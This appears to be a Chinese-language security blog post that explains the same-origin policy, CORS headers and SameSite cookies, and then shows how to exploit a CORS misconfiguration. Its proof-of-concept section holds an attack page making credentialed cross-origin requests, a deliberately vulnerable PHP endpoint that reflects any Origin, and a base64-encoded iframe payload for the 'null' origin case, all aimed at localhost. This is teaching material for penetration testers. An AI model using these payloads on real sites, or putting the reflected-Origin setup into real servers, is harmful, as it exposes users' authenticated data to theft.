@@ -1,0 +1,1562 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="前端跨域漏洞, InBlog">
+    <meta name="description" content="同源策略如果两个 URL 的协议、端口（如果有指定的话）和主机都相同的话，则这两个 URL 是同源的。这个方案也被称为“协议&amp;#x2F;主机&amp;#x2F;端口元组”，或者直接是“元组”。（“元组”是指一组项目构成的整体，具有双重&amp;#x2F;三">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>前端跨域漏洞 | InBlog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+    <style>
+        body{
+            background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
+            background-repeat:no-repeat;
+            background-size: 100% 100%;
+            background-attachment:fixed;
+        }
+    </style>
+
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">InBlog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">InBlog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">前端跨域漏洞</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%89%8D%E7%AB%AF%E6%BC%8F%E6%B4%9E/">
+                                <span class="chip bg-color">前端漏洞</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                渗透测试
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2024-11-11
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.3k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    14 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+        <!-- 代码块折行 -->
+        <style type="text/css">
+            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
+        </style>
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>如果两个 URL 的协议、端口（如果有指定的话）和主机都相同的话，则这两个 URL 是<em>同源</em>的。这个方案也被称为“协议&#x2F;主机&#x2F;端口元组”，或者直接是“元组”。（“元组”是指一组项目构成的整体，具有双重&#x2F;三重&#x2F;四重&#x2F;五重等通用形式。）	</p>
+<p>与 URL <code>http://store.company.com/dir/page.html</code> 的源进行对比的示例：</p>
+<table>
+<thead>
+<tr>
+<th align="left">URL</th>
+<th align="left">结果</th>
+<th align="left">原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>http://store.company.com/dir2/other.html</code></td>
+<td align="left">同源</td>
+<td align="left">只有路径不同</td>
+</tr>
+<tr>
+<td align="left"><code>http://store.company.com/dir/inner/another.html</code></td>
+<td align="left">同源</td>
+<td align="left">只有路径不同</td>
+</tr>
+<tr>
+<td align="left"><code>https://store.company.com/secure.html</code></td>
+<td align="left">失败</td>
+<td align="left">协议不同</td>
+</tr>
+<tr>
+<td align="left"><code>http://store.company.com:81/dir/etc.html</code></td>
+<td align="left">失败</td>
+<td align="left">端口不同（<code>http://</code> 默认端口是 80）</td>
+</tr>
+<tr>
+<td align="left"><code>http://news.company.com/dir/other.html</code></td>
+<td align="left">失败</td>
+<td align="left">主机不同</td>
+</tr>
+</tbody></table>
+<p><strong>源的更改</strong></p>
+<p>脚本可以将 <code>document.domain</code> 的值设置为其当前域或其当前域的父域。如果将其设置为其当前域的父域，则这个较短的父域将用于后续源检查。</p>
+<p><code>http://store.company.com/dir/other.html</code> 文档中的一个脚本执行以下语句：</p>
+<pre class="language-none"><code class="language-none">document.domain &#x3D; &quot;company.com&quot;;</code></pre>
+
+<p>这条语句执行之后，页面将会成功地通过与 <code>http://company.com/dir/page.html</code> 的同源检测</p>
+<p><strong>cookie的同源策略</strong></p>
+<p>cookie使用不同的源定义方式，一个页面可以为本域和任何父域设置cookie，只要是父域不是公共后缀(public suffix)即可。</p>
+<p>不管使用哪个协议(HTTP&#x2F;HTTPS)或端口号，浏览器都允许给定的域以及其任何子域名访问cookie。设置 cookie时，可以使用 <code>domain</code> &#x2F; <code>path</code> &#x2F; <code>secure</code> 和 <code>http-only</code> 标记来限定其访问性。</p>
+<p>所以 <code>https://localhost:8080/</code> 和 <code>http://localhost:8081/</code> 的Cookie是共享的。</p>
+<p> <strong>跨源脚本API访问</strong></p>
+<p>Javascript的APIs中，如 <code>iframe.contentWindow</code> , <code>window.parent</code>, <code>window.open</code> 和 <code>window.opener</code> 允许文档间相互引用。当两个文档的源不同时，这些引用方式将对 <code>window</code> 和 <code>location</code> 对象的访问添加限制。</p>
+<p><code>window</code> 允许跨源访问的方法有</p>
+<ul>
+<li>window.blur</li>
+<li>window.close</li>
+<li>window.focus</li>
+<li>window.postMessage</li>
+</ul>
+<p><code>window</code> 允许跨源访问的属性有</p>
+<ul>
+<li>window.closed</li>
+<li>window.frames</li>
+<li>window.length</li>
+<li>window.location</li>
+<li>window.opener</li>
+<li>window.parent</li>
+<li>window.self</li>
+<li>window.top</li>
+<li>window.window</li>
+</ul>
+<p>其中 <code>window.location</code> 允许读&#x2F;写，其他的属性只允许读</p>
+<p><strong>常见请求头</strong></p>
+<ul>
+<li><ul>
+<li><p>Origin</p>
+<p>预检请求或实际请求的源站URI, 浏览器请求默认会发送该字段<code>Origin: &lt;origin&gt;</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Access-Control-Request-Method</p>
+<p>声明请求使用的方法<code>Access-Control-Request-Method: &lt;method&gt;</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Access-Control-Request-Headers</p>
+<p>声明请求使用的header字段<code>Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>常见返回头</strong></p>
+<ul>
+<li><ul>
+<li><p>Access-Control-Allow-Origin</p>
+<p>声明允许访问的源外域URI对于携带身份凭证的请求不可使用通配符 <code>*``Access-Control-Allow-Origin: &lt;origin&gt; | *</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Access-Control-Expose-Headers</p>
+<p>声明允许暴露的头e.g. <code>Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Access-Control-Max-Age</p>
+<p>声明Cache时间<code>Access-Control-Max-Age: &lt;delta-seconds&gt;</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Access-Control-Allow-Credentials</p>
+<p>声明是否允许在请求中带入<code>Access-Control-Allow-Credentials: true</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Access-Control-Allow-Methods</p>
+<p>声明允许的访问方式<code>Access-Control-Allow-Methods: &lt;method&gt;[, &lt;method&gt;]*</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Access-Control-Allow-Headers</p>
+<p>声明允许的头<code>Access-Control-Allow-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/vuln/xss/sop.html">https://websec.readthedocs.io/zh/latest/vuln/xss/sop.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy</a></p>
+<h1 id="CORS漏洞"><a href="#CORS漏洞" class="headerlink" title="CORS漏洞"></a>CORS漏洞</h1><h2 id="什么是CORS"><a href="#什么是CORS" class="headerlink" title="什么是CORS"></a>什么是CORS</h2><p>COTS全称”跨域资源共享”（Cross-origin resource sharing），是一种基于 HTTP 头的机制，这个机制通过允许服务器标示除了它自己以外的其它源（域、协议或端口），使得浏览器允许这些源访问加载自己的资源。他的出现就是为了弥补SOP（同源策略）的不足，因为有些业务的原因，需要绕过SOP（同源策略）来实现跨域资源共享。</p>
+<p>而CORS漏洞则是配置不当，Access-Control-Allow-Origin字段代表允许哪个域访问加载自己的资源，如果当字段值为’*’，就代表任意域都可以访问，这时候就造成了CORS漏洞了。</p>
+<h2 id="CORS-相关-headers"><a href="#CORS-相关-headers" class="headerlink" title="CORS 相关 headers"></a>CORS 相关 headers</h2><ul>
+<li><p><code>Origin</code>: 指请求发起方域</p>
+</li>
+<li><p><code>Access-Control-Request-Headers</code>：用于预检请求，告知服务器实际请求会有哪些自定义头部字段</p>
+</li>
+<li><p><code>Access-Control-Request-Method</code>：用于预检请求，告知服务器实际请求会使用哪一种方法</p>
+</li>
+<li><p><code>Access-Control-Allow-Origin</code>：指请求资源允许跟哪些域共享</p>
+</li>
+<li><p><code>Access-Control-Allow-Credentials</code>：指是否允许浏览器发送包含凭据的请求</p>
+</li>
+<li><p><code>Access-Control-Allow-Headers</code>：指实际请求允许使用的自定义请求头</p>
+</li>
+<li><p><code>Access-Control-Allow-Methods</code>：指实际请求允许使用的请求方法</p>
+</li>
+<li><p><code>Access-Control-Expose-Headers</code>：指允许 js 获取的响应头部中的字段</p>
+</li>
+<li><p><code>Access-Control-Max-Age</code>：指预检请求的结果在多少秒内有效</p>
+</li>
+</ul>
+<p>SameStie：</p>
+<ul>
+<li>Strict表示该Cookie仅用作第一方Cookie。并且当用户从A网站移动到B网站时，首次访问中不发送标为Strict的B网站Cookie。这对安全性需求较高的网站比较适用。如果你的B网站登录状态为“登录中”，那么A网站点到B网站时，登录状态为“未登录”。用户需要再点一次登录。这对一些“更改密码”或者“进行结账”的访问比较合适。</li>
+<li>Lax与Strict大致相当，表示该Cookie仅用作第一方Cookie。但去掉了首次从其他网站来的推荐访问不发送Cookie的限制。</li>
+<li>None则表示该Cookie可被跨域发送。当前版本的Chrome浏览器中，如果Cookie没有声明SameSite的值，则默认为None。</li>
+</ul>
+<h2 id="CORS漏洞挖掘："><a href="#CORS漏洞挖掘：" class="headerlink" title="CORS漏洞挖掘："></a>CORS漏洞挖掘：</h2><p><strong>利用条件</strong></p>
+<p>Cookie 的 SameSite 属性用来限制第三方 Cookie，从而减少安全风险。如果是老版本的谷歌SameStie是默认为None的，但在Chrome 80中默认值将为Lax。所以SameStie还要设置为None才行</p>
+<p><img src="/images/posts/%E5%89%8D%E7%AB%AF%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/image-20241110165424929.png"></p>
+<p>请求头添加：Origin: <a target="_blank" rel="noopener" href="https://example.com/">https://example.com</a></p>
+<p>条件2：</p>
+<p>如果返回头是以下，那么可直接利用</p>
+<ul>
+<li>Access-Control-Allow-Origin: <a target="_blank" rel="noopener" href="https://example.com/">https://example.com</a></li>
+<li>Access-Control-Allow-Credentials: true</li>
+</ul>
+<p>利用麻烦</p>
+<ul>
+<li>Access-Control-Allow-Origin: null</li>
+<li>Access-Control-Allow-Credentials: true</li>
+</ul>
+<p>不存在情况,Null要小写才存在</p>
+<ul>
+<li>Access-Control-Allow-Origin: Null</li>
+<li>Access-Control-Allow-Credentials: true</li>
+</ul>
+<p>以下不存在，可写低危CORS配置错误</p>
+<ul>
+<li>Access-Control-Allow-Origin:  *</li>
+<li>Access-Control-Allow-Credentials: true</li>
+</ul>
+<p>或者</p>
+<ul>
+<li>Access-Control-Allow-Origin:  *</li>
+</ul>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><strong>POC</strong></p>
+<p>attack.html</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>demo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">cors</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Exploit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">function</span> <span class="token function">cors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">var</span> xhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        xhttp<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span>xhttp<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span>
+            <span class="token punctuation">&#123;</span>
+                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+        xhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"http://127.0.0.1/admin/sensitive.php"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span>
+        xhttp<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span>
+        xhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
+
+<p>login.php</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'OPTIONS'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token comment">// 对预检请求返回 200 状态码并退出</span>
+    <span class="token function">http_response_code</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">exit</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// 处理实际的 GET 请求</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$user</span> <span class="token operator">!==</span> <span class="token constant">null</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$user</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/admin; SameSite=None; Secure'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"登录成功"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"状态：未登录"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p>sensitive.php</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Access-Control-Allow-Origin: "</span> <span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_ORIGIN'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Access-Control-Allow-Credentials: true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'OPTIONS'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token function">http_response_code</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">exit</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// 处理实际的 GET 请求</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"交易密码是 123"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"未获取到交易密码"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p>如果是第二种<code>header(&quot;Access-Control-Allow-Origin: &quot; . &quot;null&quot;);</code>的情况</p>
+<p>用iframe标签</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>iframe sandbox<span class="token operator">=</span><span class="token string">"allow-scripts"</span> src<span class="token operator">=</span><span class="token string">"data:text/html;base64,PHNjcmlwdD4KICAgIHZhciB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKICAgIHhoci5vcGVuKCdHRVQnLCAnaHR0cDovLzEyNy4wLjAuMS9hZG1pbi9zZW5zaXRpdmUucGhwJywgdHJ1ZSk7CiAgICB4aHIud2l0aENyZWRlbnRpYWxzID0gdHJ1ZTsKICAgIHhoci5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbiAoKSB7CiAgICAgICAgaWYgKHhoci5zdGF0dXMgPT09IDIwMCkgewogICAgICAgICAgICBjb25zb2xlLmxvZyh4aHIucmVzcG9uc2VUZXh0KTsKICAgICAgICB9CiAgICB9OwogICAgeGhyLnNlbmQoKTsKPC9zY3JpcHQ+"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span></code></pre>
+
+<p>base64编码内容是</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
+    <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'http://127.0.0.1/admin/sensitive.php'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    xhr<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+    xhr<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
+
+<p>控制台成功打印出敏感信息</p>
+<p>BP可直接过滤搜索存在漏洞的包</p>
+<p><img src="/images/posts/%E5%89%8D%E7%AB%AF%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/image-20241110174026646.png"></p>
+<p><img src="/images/posts/%E5%89%8D%E7%AB%AF%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/image-20241110174146337.png"></p>
+<p><code>Access-Control-Allow-Origin: foo.example.org</code></p>
+<p><strong>参考：</strong></p>
